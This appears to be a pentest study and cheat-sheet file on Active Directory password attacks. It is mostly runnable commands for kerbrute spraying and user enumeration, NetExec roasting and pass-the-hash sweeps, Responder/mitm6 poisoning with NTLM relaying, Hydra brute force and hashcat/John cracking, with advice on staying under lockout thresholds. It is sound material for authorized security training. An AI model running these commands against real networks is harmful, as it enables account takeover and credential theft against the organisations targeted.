# Password Attacks — Advanced Toolkit (2026)

*Beyond basic hashcat mode usage (see CHEATSHEET.md §4 for the mode-number reference). For authorized pentest/exam prep only.*

Modern AD-focused engagements favor unauthenticated Kerberos pre-auth abuse over noisy SMB/LDAP binds, since Kerberos pre-auth failures are timed/logged differently and don't always burn the bad-password counter the same way.

---

## Kerbrute — unauthenticated domain user enumeration & spraying

Abuses Kerberos AS-REQ pre-auth responses: `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` = user doesn't exist; pre-auth-required response = valid username. No Windows 4625 failed-logon event is generated.

```bash
# User enumeration
./kerbrute userenum -d corp.local --dc 192.168.56.101 usernames.txt -o valid_users.txt

# AS-REP roasting sweep — kerbrute has no dedicated 'asreproast' subcommand; userenum's
# --hash-file flag captures hashcat-crackable AS-REP (mode 18200) for any account with preauth disabled
./kerbrute userenum -d corp.local --dc 192.168.56.101 users.txt --hash-file asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
# Alternatives: Impacket's GetNPUsers.py, or nxc's --asreproast flag (see NetExec section below)

# Password spraying via Kerberos pre-auth — faster/quieter than SMB/LDAP binds,
# but STILL counts against lockout policy; --safe aborts on lockout signal
./kerbrute passwordspray -d corp.local --dc 192.168.56.101 valid_users.txt 'Summer2026!' --safe
```
**Reference:** https://github.com/ropnop/kerbrute

## NetExec (nxc) — CrackMapExec successor (CME is archived/unmaintained — use nxc, not cme)

```bash
pipx install git+https://github.com/Pennyw0rth/NetExec

# SMB password spraying, safe defaults
nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2026!' --continue-on-success
nxc smb DC01.corp.local -u users.txt -p creds.txt --no-bruteforce --continue-on-success   # 1-to-1 pairing, avoids lockouts
nxc smb DC01.corp.local -u administrator -p 'pass' --local-auth   # local (non-domain) accounts

# LDAP-based roasting once you hold any valid domain credential
nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' --asreproast asrep_out.txt      # hashcat mode 18200
nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' --kerberoasting kerberoast_out.txt  # hashcat mode 13100
```
NTDS/DCSync dumps (`notes/credentials-harvesting-post-exploitation.md`) and decoded gMSA passwords (`notes/ad-delegation-trust-bloodhound.md`'s ReadGMSAPassword) are raw NTLM output — same format as the local SAM, crack both with `hashcat -m 1000` (CHEATSHEET.md §4).

**Reference:** https://github.com/Pennyw0rth/NetExec · https://www.netexec.wiki/

## Lockout-Aware Spraying — Check the Password Policy First

Spraying blind risks locking out every account in the target OU before you get a hit. Pull `lockoutThreshold`/`lockoutDuration`/`lockoutObservationWindow` before choosing a password count or spray interval.
```bash
# Password policy via SAMR — try anonymously first (works on domains that haven't
# locked down null-session SAMR access), fall back to any valid low-priv credential
nxc smb DC01.corp.local -u '' -p '' --pass-pol
nxc smb DC01.corp.local -u lowpriv -p 'Passw0rd!' --pass-pol

# Rule of thumb: if lockoutThreshold=5 within a 30-min lockoutObservationWindow,
# spray at most 1 password per account per 30-min window (stay under threshold-1
# to leave headroom for legitimate user typos already counted)
```
Neither `nxc` nor `kerbrute passwordspray` throttles multi-round spraying for you — space repeat rounds out yourself (`sleep`/cron between rounds) so cumulative attempts per account stay under the threshold inside one observation window. `kerbrute`'s `--delay <ms>` flag (forces single-threaded pacing) is the gentler option for a single Kerberos pre-auth spray run since it doesn't burn the standard 4625 SMB/LDAP bad-password counter the same way (see intro above); still counts against the policy either way.

**Reference:** https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-password-policy-1 · https://www.thehacker.recipes/ad/recon/password-policy

## Credential Reuse — Validate a Found Credential Across Services

One valid credential (from a spray hit, roast, or Responder capture) is often reused on other listening services — check before committing to a single attack path. `nxc` supports all of these protocols with identical `-u`/`-p`/`-H` syntax, so a found cred is a one-liner-per-protocol away from a reuse map.
```bash
nxc smb    10.10.10.0/24 -u user -p 'Summer2026!'
nxc winrm  10.10.10.0/24 -u user -p 'Summer2026!'   # (Pwn3d!) = admin-equivalent, evil-winrm next
nxc rdp    10.10.10.0/24 -u user -p 'Summer2026!'
nxc mssql  10.10.10.0/24 -u user -p 'Summer2026!'
nxc ssh    10.10.10.0/24 -u user -p 'Summer2026!'
nxc ftp    10.10.10.0/24 -u user -p 'Summer2026!'

# Same sweep with a captured NTLM hash instead of a cracked password (pass-the-hash)
nxc smb 10.10.10.0/24 -u user -H aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
```
`(Pwn3d!)` in `nxc winrm`/`nxc rdp` output flags admin-equivalent access on that host specifically — worth prioritizing over a plain auth success.

**Reference:** https://www.netexec.wiki/getting-started/using-credentials

## Responder / mitm6 — network hash capture (LLMNR/NBT-NS/mDNS + IPv6 DNS takeover)

Captures Net-NTLMv2 challenge/response hashes from broadcast name-resolution traffic without needing any prior credential — often the very first crackable hash on an internal AD assessment.
```bash
# Responder — poison LLMNR/NBT-NS/mDNS, log Net-NTLMv2 to /usr/share/responder/logs/
sudo responder -I eth0 -wrf

# mitm6 — IPv6 DNS takeover, forces Windows hosts to prefer attacker as DNS/WPAD over IPv6
sudo mitm6 -d corp.local
# pair with ntlmrelayx to relay the captured auth instead of just logging it
sudo ntlmrelayx.py -6 -t ldaps://192.168.56.101 -wh fakewpad.corp.local -l loot

# Crack captured Net-NTLMv2 hashes offline
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```
**Reference:** https://github.com/lgandx/Responder · https://github.com/dirkjanm/mitm6

## Hydra — service-specific brute force

Target syntax: `service://host[:port]/params`, or classic `-l/-L -p/-P host service`.
```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5 -t 4 -f -V

# FTP
hydra -L users.txt -P passwords.txt ftp://10.10.10.5 -t 4 -f

# RDP (fragile module — keep -t low, expect false negatives)
hydra -L users.txt -P passwords.txt rdp://10.10.10.5 -t 1 -f

# SMB
hydra -l admin -P wordlist.txt smb://10.10.10.5 -t 4 -f -V

# HTTP POST login form (F= marks a failure string to match on)
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&submit=Login:F=incorrect password"
```
`hydra -U <module>` prints module-specific optional parameters before crafting an attack string.
**Reference:** https://github.com/vanhauser-thc/thc-hydra

## John the Ripper — rule-based mutation attacks

Rules live in `john.conf` under `[List.Rules:Name]`. Rule-based mutation dramatically outperforms raw wordlist attacks against real-world AD dumps.
```bash
john --wordlist=rockyou.txt --rules=KoreLogicRules hashes.txt
john --format=NT --wordlist=rockyou.txt --rules=Jumbo hashes.txt
john --show hashes.txt
```
**Reference:** https://www.openwall.com/john/doc/RULES.shtml

### OneRuleToRuleThemAll — highest-yield general-purpose rule file

Built from the top-25%-performing rules of best64, KoreLogic Rockyou50000, dive, T0XICv1, InsidePro, etc. Compatible with both John and Hashcat rule syntax.
```bash
# Hashcat (faster, GPU) — most common OSCP workflow for NTLM/roasted hashes
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# John (paste rule text into a [List.Rules:OneRule] section of john.conf)
john --wordlist=rockyou.txt --rules=OneRule hashes.txt
```
**Reference:** https://github.com/NotSoSecure/password_cracking_rules

---

## Tools Reference

| Name | URL |
|---|---|
| Kerbrute | https://github.com/ropnop/kerbrute |
| NetExec (nxc) | https://github.com/Pennyw0rth/NetExec (docs: https://www.netexec.wiki/) |
| Responder | https://github.com/lgandx/Responder |
| mitm6 | https://github.com/dirkjanm/mitm6 |
| CrackMapExec (legacy, archived — do not use) | https://github.com/byt3bl33d3r/CrackMapExec |
| THC-Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John the Ripper (jumbo) | https://github.com/openwall/john |
| OneRuleToRuleThemAll | https://github.com/NotSoSecure/password_cracking_rules |
| Hashcat | https://hashcat.net/hashcat/ |
